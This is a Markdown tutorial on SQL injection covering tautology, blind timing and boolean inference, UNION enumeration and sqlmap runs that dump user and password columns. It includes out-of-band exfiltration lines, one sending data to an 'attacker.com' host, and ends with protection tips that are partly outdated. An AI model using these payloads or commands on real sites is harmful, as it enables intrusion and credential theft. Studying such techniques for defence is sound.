# SQL Injections (SQLi)

![](http://i.imgur.com/AcVJKT2.png)

* SQL works by building query statements, these statements are intended to be readbale and intuitive.


* A SQL query  search can be easily manipulated and assume that a SQL query search is a reliable command. This means  that SQL searches are capable of passing, unnoticed, by access control mechanisms.
* Using methods of diverting standard authentication and by checking the authorization credentials, you can gain access to important information stored in a database.

* Exploitation:
	- Dumping contents from the database.
	- Inserting new data.
	- Modifying existing data.
	- Writing to disk.

## The Simplest Example

A parameter passed for a name of a user:

```
SELECT * FROM users WHERE
name="$name";
```

In this case, the attacker just needs to introduce a true logical expression like ```1=1```:

```
SELECT * FROM users WHERE 1=1;
```
So that the **WHERE** clause is always executed, which means that it will return the values that match to all users.

Nowadays it is estimated that less than 5% of the websites have this vulnerability.

These types of flaws facilitate the occurrence of other attacks, such as XSS or buffer overflows.

## Blind SQL Injection

* INFERENCE: useful technique when data not returned and/or detailed error messages disabled. We can differentiate between two states based on some attribute of the page response.

* It's estimated that over 20% of the websites have this flow.

* In traditional SQLi it is possible to reveal the information by the attacker writing a payload. In the blind SQLi, the attacker needs to ask the server if something is TRUE or FALSE. For example, you can ask for a user. If the user exists, it will load the website, so it's true.

* Timing-based techniques: infer based on delaying database queries (sleep(), waitfor delay, etc).

```
IF SYSTEM_USER="john" WAIFOR DELAY '0:0:15'
```

* Response-based techniques (True or False): infer based on text in response. Examples:

```
SELECT count (*) FROM reviews WHERE author='bob' (true)
SELECT count (*) FROM reviews WHERE author='bob' and '1'='1' (true)
SELECT count (*) FROM reviews WHERE author='bob' and '1'='2' (false)
SELECT count (*) FROM reviews WHERE author='bob' and SYSTEM_USER='john' (false)
SELECT count (*) FROM reviews WHERE author='bob' and SUBSTRING(SYSTEM_USER,1,1)='a' (false)
SELECT count (*) FROM reviews WHERE author='bob' and SUBSTRING(SYSTEM_USER,1,1)='c' (true)
```
(and continue to iterate until finding the value of SYSTEM_USER).

* Utilize transport outside of HTTP response.

```
SELECT * FROM  reviews WHERE review_author=UTL_INADDR.GET_HOST_ADDRESS((select user from dual ||'.attacker.com'));
INSERT into openowset('sqloledb','Network=DBMSSOCN; Address=10.0.0.2,1088;uid=gds574;pwd=XXX','SELECT * from tableresults') Select name,uid,isntuser from master.dbo.sysusers--
```

### Common ways of Exploitation
* Every time you see an URL, the **question mark** followed by some type of letter or word means that a value is being sent from a page to another.

* In the example
```
http://www.website.com/info.php?id=10
```
the page *info.php* is receiving the data and will have some code like:
```
$id=$_post['id'];
```
and an associated SQL query:
```
QueryHere = "select * from information where code='$id'"
```



#### Checking for vulnerability
We can start to verifying whether the target is vulnerable by attaching a simple quote symbol ```'``` in the end of the URL:

```
http://www.website.com/info.php?id=10'
```

If the website returns the following error:

		You have an error in your SQL syntax...

It means that this website is vulnerable to SQL.

#### Find the structure of the database
To find the number of columns and tables in a database we can use [Python's SQLmap](http://sqlmap.org/).

This application streamlines the SQL injection process by automating the detection and exploitation of SQL injection flaws of a database. There are several automated mechanisms to find the database name, table names, and number of columns.

* ORDER BY: it tries to order all columns form x to infinity. The iteration stops when the response shows that the input column x does not exist, reveling the value of x.

* UNION: it gathers several data located in different table columns. The automated process tries to gather all information contained in columns/table x,y,z obtained by ORDER BY. The payload is similar to:

```
?id=5'%22union%22all%22select%221,2,3
```

* Normally the databases are defined with names such as: user, admin, member, password, passwd, pwd, user_name. The injector uses a trial and error technique to try to identify the name:

```
?id=5'%22union%22all%22select%221,2,3%22from%22admin
```
So, for example, to find the database name, we run the *sqlmap* script with target *-u* and enumeration options *--dbs* (enumerate DBMS databases):

```
$ ./sqlmap.py -u <WEBSITE> --dbs
(...)
[12:59:20] [INFO] testing if URI parameter '#1*' is dynamic
[12:59:22] [INFO] confirming that URI parameter '#1*' is dynamic
[12:59:23] [WARNING] URI parameter '#1*' does not appear dynamic
[12:59:25] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[12:59:25] [INFO] testing for SQL injection on URI parameter '#1*'
[12:59:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:59:27] [WARNING] reflective value(s) found and filtering out
[12:59:51] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
[13:00:05] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[13:00:16] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'
(...)
```

#### Gaining access to the Database

* From this we can verify what databases we have available, for example. From this we can find out how many tables exist, and their respective names. The sqlmap command is:

```
./sqlmap -u <WEBSITE> --tables <DATABASE-NAME>
```

* The main objective is to find  usernames and passwords in order to gain access/login to the site, for example in a table named *users*. The sqlmap command is

```
./sqlmap -u <WEBSITE> --columns -D <DATABASE-NAME> -T <TABLE-NAME>
```

This will return information about the columns in the given table.

* Now we can dump all the data of all columns using the flag ```-C``` for column names:

```
./sqlmap -u <WEBSITE> --columns -D <DATABASE-NAME> -T <TABLE-NAME> -C 'id,name,password,login,email' --dump
```

If the password are clear text (not hashed in md5, etc), we have access to the website.

## Basic SQL Injection Exploit Steps

1. Fingerprint database server.
2. Get an initial working exploit. Examples of payloads:
	- '
	- '--
	- ')--
	- '))--
	- or '1'='1'
	- or '1'='1
	- 1--
3. Extract data through UNION statements:
	- NULL: use as a column place holder helps with data type conversion errors
	- GROUP BY - help determine number of columns
4. Enumerate database schema.
5. Dump application data.
6. Escalate privilege and pwn the OS.






## Some Protection Tips

* Never connect to a database as a super user or as a root.
* Sanitize any user input. PHP has several functions that validate functions such as:
	- is_numeric()
	- ctype_digit()
	- settype()
	- addslahes()
	- str_replace()
* Add quotes ```"``` to all non-numeric input values that will be passed to the database by using escape chars functions:
	- mysql_real_escape_string()
	- sqlit_escape_string()

```php
$name = 'John';
$name = mysql_real_escape_string($name);
$SQL = "SELECT * FROM users WHERE username='$name'";
```

* Always perform a parse of data that is received from the user (POST and FORM methods).
	- The chars to be checked:```", ', whitespace, ;, =, <, >, !, --, #, //```.
	- The reserved words: SELECT, INSERT, UPDATE, DELETE, JOIN, WHERE, LEFT, INNER, NOT, IN, LIKE, TRUNCATE, DROP, CREATE, ALTER, DELIMITER.

* Do not display explicit error messages that show the request or a part of the SQL request. They can help fingerprint the RDBMS(MSSQL, MySQL).

* Erase user accounts that are not used (and default accounts).

* Other tools: blacklists, AMNESIA, Java Static Tainting, Codeigniter.

